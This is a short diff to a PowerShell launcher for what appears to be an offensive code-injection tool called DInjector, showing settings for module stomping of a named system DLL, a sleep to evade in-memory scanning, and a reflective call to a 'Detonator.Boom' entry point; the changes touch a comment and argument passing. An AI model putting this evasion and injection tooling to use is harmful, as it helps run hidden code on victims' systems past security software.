@@ -53,7 +53,7 @@ $K = "xpsservices.dll"
 # exported function name to overwrite (used in "modulestomping")
 $L = "DllCanUnloadNow"
 
-# number of seconds (approx.) to sleep before execution to evade in-memory scan (for values greater than "60" it will take much longer to sleep)
+# number of seconds (approx.) to sleep before execution to evade potential in-memory scan (for values greater than "60" it will take much longer to sleep)
 $M = "0"
 
 # block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
@@ -96,4 +96,4 @@ $flags = [Reflection.BindingFlags] "Public,NonPublic,Static"
 $class = $assem.GetType("DInjector.Detonator", $flags)
 $entry = $class.GetMethod("Boom", $flags)
 
-$entry.Invoke($null, (, $cmd.Split(" ")))
+$entry.Invoke($null, (, $cmd))
